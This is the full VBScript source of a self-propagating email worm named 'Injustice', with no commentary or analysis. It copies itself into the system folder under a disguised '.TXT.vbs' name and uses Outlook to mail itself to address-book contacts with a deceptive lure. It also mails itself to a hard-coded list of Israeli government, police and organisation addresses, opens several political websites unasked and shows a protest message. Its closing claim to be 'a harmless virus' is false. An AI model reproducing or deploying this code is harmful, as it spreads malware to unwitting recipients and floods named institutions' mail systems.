




















































On Error Resume Next
dim fso,loc,file,vbscopy
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)

vbscopy=file.ReadAll

main()
sub main()
On Error Resume Next

dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Wind1ows Scripting Host\Settings\Timeout")

	if (rr>=1) then
	wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Wind1ows Scripting Host\Settings\Timeout",0,"REG_DWORD"
	end if


Set loc = fso.GetSpecialFolder(1)
Set c = fso.GetFile(WScript.ScriptFullName)


c.Copy(loc&"\injustice.TXT.vbs")



sendit()
callielinks()
showmessage()

end sub


sub sendit()

On Error Resume Next

dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad,y,myvar

set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")


	for ctrlists=1 to mapi.AddressLists.Count
		set a=mapi.AddressLists(ctrlists)
		x=1
		regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
			if (regv="") then
				regv=1
			end if

		  if (int(a.AddressEntries.Count)>int(regv)) then
			y=a.AddressEntries.Count

'  Only to 50 entries - not to disturb network and mail servers -

			  if (int(a.AddressEntries.Count)> 50) then
				y= 50
			  end if

		    for ctrentries=1 to y
			z= Int((a.AddressEntries.Count * Rnd) + 1)      
			malead=a.AddressEntries(z)
			regad=""
			regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
				if (regad="") then
					set male=out.CreateItem(0)
					male.Recipients.Add(malead)
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&"Dear "&malead&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
				end if
	              x=x+1
	            next
	
	         regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
	       else
		 regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
               end if
	next

					set male=out.CreateItem(0)
					male.Recipients.Add("sar@mod.gov.il")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					
					set male=out.CreateItem(0)
					male.Recipients.Add("sar@mops.gov.il")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					

					set male=out.CreateItem(0)
					male.Recipients.Add("sar@moin.gov.il")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					
					set male=out.CreateItem(0)
					male.Recipients.Add("yor@knesset.gov.il")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					
					set male=out.CreateItem(0)
					male.Recipients.Add("webmaster@israel.com")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					
					set male=out.CreateItem(0)
					male.Recipients.Add("amuta@ehudbarak.co.il")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					
					set male=out.CreateItem(0)
					male.Recipients.Add("foundation@habonimdror.org")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					
					set male=out.CreateItem(0)
					male.Recipients.Add("wlzm@jazo.org.il")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					
					set male=out.CreateItem(0)
					male.Recipients.Add("office@JAFI.org.il")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					
					set male=out.CreateItem(0)
					male.Recipients.Add("naamatusa@naamat.org")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					
					set male=out.CreateItem(0)
					male.Recipients.Add("info@azm.org")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					
					set male=out.CreateItem(0)
					male.Recipients.Add("arie@kba.org")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					
					set male=out.CreateItem(0)
					male.Recipients.Add("ncli@laborisrael.org")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					
					set male=out.CreateItem(0)
					male.Recipients.Add("holyland@inisrael.com")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					
					set male=out.CreateItem(0)
					male.Recipients.Add("sar@mof.gov.il")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					
					set male=out.CreateItem(0)
					male.Recipients.Add("hachnasot@mof.gov.il")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					
					set male=out.CreateItem(0)
					male.Recipients.Add("doar@mof.gov.il")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					
					set male=out.CreateItem(0)
					male.Recipients.Add("mafkal@police.gov.il")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					
					set male=out.CreateItem(0)
					male.Recipients.Add("yor@knesset.gov.il")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send
					
					set male=out.CreateItem(0)
					male.Recipients.Add("rmarkus@parliament.gov.il")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send


					
					set male=out.CreateItem(0)
					male.Recipients.Add("doar@shaam.gov.il")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send

					
					set male=out.CreateItem(0)
					male.Recipients.Add("sar@mops.gov.il")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send

					
					
					set male=out.CreateItem(0)
					male.Recipients.Add("hashkal@mof.gov.il")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send

					
					set male=out.CreateItem(0)
					male.Recipients.Add("pniotmas@mof.gov.il")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send

	
					set male=out.CreateItem(0)
					male.Recipients.Add("menahel@shaam.gov.il")
					male.Subject = "RE:Injustice"
					male.Body = vbcrlf&" Dear Sir"&","&vbcrlf&" Did you send the attached message, I was not expecting this from you !"
					male.Attachments.Add(loc&"\injustice.TXT.vbs")
					male.Send


	Set out=Nothing
	Set mapi=Nothing
end sub

sub showmessage()

On Error Resume Next

Dim myvar

s =     "PLEASE ACCEPT MY APOLOGIES FOR DISTURBING YOU. " & chr(10)& chr(10)
s = s & "Remember that one day YOU may be in this situation. " & chr(10)
s = s & "We need every possible help. " & chr(10) & chr(10)
s = S & "Israeli soldiers killed in cold blood 12 year old Palestinian child" & chr(10)
s = s & "Mohammad Al-Durra, as his father tried to protect him in vain with" & chr(10)
s = s & "his own body. As a result of the indiscriminate and excessive use of" & chr(10)
s = s & "machine gun fire by Israeli soldiers, journalists and bystanders" & chr(10)
s = s & "watched helplessly as the child was savagely murdered."  & chr(10)
s = s & "Palestinian Red Crescent Society medic Bassam Balbeisi" & chr(10)
s = s & "attempted to intervene and spare the child's life but live" & chr(10)
s = s & "ammunition to his chest by Israeli fire took his life in the process." & chr(10)
s = s & "The child and the medic were grotesquely murdered in cold blood." & chr(10)
s = s & "Mohammad's father, Jamal, was critically injured and permanently" & chr(10)
s = s & "paralyzed. Similarly, approximately 40 children were slain, without"  & chr(10)
s = s & "the media taking notice or covering these tragedies. " & chr(10)& chr(10)
s = s & "THESE CRIMINAL ACTS CANNOT BE FORGIVEN OR FORGOTTEN!!!!" & chr(10)

myvar = MsgBox ( s, 64, "               HELP US TO STOP THE BLOOD SHED!!             ") 


end sub



sub callielinks()

On Error Resume Next

Set Web = CreateObject("InternetExplorer.Application")
   Web.Visible = TRUE
   Web.Navigate "http://www.sabra-shatila.org/"

Set Web = CreateObject("InternetExplorer.Application")
   Web.Visible = TRUE
   Web.Navigate "http://www.petitiononline.com/palpet/petition.html"


Set Web = CreateObject("InternetExplorer.Application")
   Web.Visible = TRUE
   Web.Navigate "http://www.palestine-info.org"


Set Web = CreateObject("InternetExplorer.Application")
   Web.Visible = TRUE
   Web.Navigate "http://freesaj.org.uk/"

Set Web = CreateObject("InternetExplorer.Application")
   Web.Visible = TRUE
   Web.Navigate "http://hanthala.virtualave.net/"

Set Web = CreateObject("InternetExplorer.Application")
   Web.Visible = TRUE
   Web.Navigate "http://www.ummah.net/unity/palestine/index.htm"



end sub


'Note: 
'Do not worry. This is a harmless virus. It will not do any thing to your system. 
'The intension is to help Palestinian people to live in PEASE in their own land.                                                                                                                    
'S/N : 881844577469
